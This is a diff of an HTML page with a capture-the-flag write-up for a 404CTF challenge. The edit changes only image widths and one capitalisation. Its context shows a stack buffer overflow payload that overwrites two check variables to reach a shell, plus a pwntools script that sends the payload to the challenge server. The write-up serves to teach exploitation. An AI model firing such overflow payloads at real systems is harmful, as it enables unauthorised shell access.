@@ -70,17 +70,17 @@
                             <div class="squarebox">r < <(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*40 + b"\xef\xbe\xad\xde" + b"\xbe\xbe\xfe\xca")')</div>
                             <img src="img/tropfacile/stack2.jpg" class="img-fluid" width="700">
                             We have overwritten the memory space allocated by the variables check and key. Then, it will lead us to a shell.
-                            <img src="img/tropfacile/localshell.jpg" class="img-fluid" width="700">
+                            <img src="img/tropfacile/localshell.jpg" class="img-fluid" width="500">
                             <h4>Scripting</h4>
                             <div class="squarebox">
-                                From pwn import * <br>
+                                from pwn import * <br>
                                 r = remote(“challenge.404ctf.fr”, “32458”) <br>
                                 offset = 40 <br>
                                 payload = b”A”*40 + b”\xef\xbe\xad\xde” + b”\xbe\xbe\xfe\xca” <br>
                                 r.sendline(payload) <br>
                                 r.interactive() <br>
                             </div>                
-                            <img src="img/tropfacile/flag.jpg" class="img-fluid" width="700">                            
+                            <img src="img/tropfacile/flag.jpg" class="img-fluid" width="800">                            
                         </p>
                     </div>
                 </div>
